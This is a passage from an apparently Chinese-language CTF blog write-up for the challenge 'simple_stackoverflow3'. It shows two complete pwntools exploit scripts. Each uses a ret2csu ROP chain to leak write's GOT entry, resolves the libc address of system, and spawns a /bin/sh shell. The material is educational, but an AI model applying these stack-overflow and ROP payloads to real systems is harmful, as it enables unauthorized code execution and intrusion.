+<p>可得到<code>system</code>函数的真实地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>]</span><br></pre></td></tr></table></figure>
+
+<p>payload2只需要执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload2 += p64(pop4address)</span><br><span class="line">payload2 += p64(poprdi) + p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next()) </span><br><span class="line">payload2 += p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p>最终的Exploit为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'simple_stackoverflow3'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">"./simple_stackoverlow3"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startAddress =    <span class="number">0x0000000000400630</span></span><br><span class="line">movcalladdress =  <span class="number">0x0000000000400880</span><span class="comment">#mov rdx,r13,rsi,r14</span></span><br><span class="line">pop6address =     <span class="number">0x000000000040089A</span><span class="comment">#pop rax,rbx,r12,r13,r14,r15</span></span><br><span class="line">pop4address =     <span class="number">0x000000000040089C</span><span class="comment">#pop r12,r13,r14,r15</span></span><br><span class="line">poprdi =          <span class="number">0x00000000004008A3</span><span class="comment">#pop rdi</span></span><br><span class="line"></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload1 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload1 += p64(pop4address)</span><br><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(movcalladdress)</span><br><span class="line">payload1 += <span class="string">"A"</span> * <span class="number">56</span> <span class="comment"># 8 * 8 = 56</span></span><br><span class="line">payload1 += p64(startAddress)</span><br><span class="line">payload1 =  payload1.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr-libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line">offset = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload2 += p64(pop4address)</span><br><span class="line">payload2 += p64(poprdi) + p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next()) </span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'simple_stackoverflow3'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(elf.path)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startAddress =    <span class="number">0x0000000000400630</span></span><br><span class="line">movcalladdress =  <span class="number">0x0000000000400880</span><span class="comment">#mov rdx,r13,rsi,r14</span></span><br><span class="line">pop6address =     <span class="number">0x000000000040089A</span><span class="comment">#pop rax,rbx,r12,r13,r14,r15</span></span><br><span class="line">pop4address =     <span class="number">0x000000000040089C</span><span class="comment">#pop r12,r13,r14,r15</span></span><br><span class="line">poprdi =          <span class="number">0x00000000004008A3</span><span class="comment">#pop rdi</span></span><br><span class="line"></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload1 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload1 += p64(pop4address)</span><br><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(movcalladdress)</span><br><span class="line">payload1 += <span class="string">"A"</span> * <span class="number">56</span> <span class="comment"># 8 * 8 = 56</span></span><br><span class="line">payload1 += p64(startAddress)</span><br><span class="line">payload1 =  payload1.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr: "</span> + hex(write_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">offset = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = write_addr - (libc.dump(<span class="string">'write'</span>)-libc.dump(<span class="string">'system'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload2 += p64(pop4address)</span><br><span class="line">payload2 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(bss_base) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(movcalladdress)</span><br><span class="line">payload2 += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">payload2 += p64(poprdi)</span><br><span class="line">payload2 += p64(bss_base)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line">payload2 =  payload2.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/08/08/XMAN-2019-╕ú╓▌-Re-baby-maze/" rel="next" title="XMAN-2019-福州-Re-baby_maze">
+                  <i class="fa fa-chevron-left"></i> XMAN-2019-福州-Re-baby_maze
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/08/09/╨┬╩╓╧≥í¬í¬╟│╠╕PLT║═GOT/" rel="prev" title="新手向——浅谈PLT和GOT">
+                  新手向——浅谈PLT和GOT <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#simple-stackoverflow3"><span class="nav-number">1.</span> <span class="nav-text">simple_stackoverflow3</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
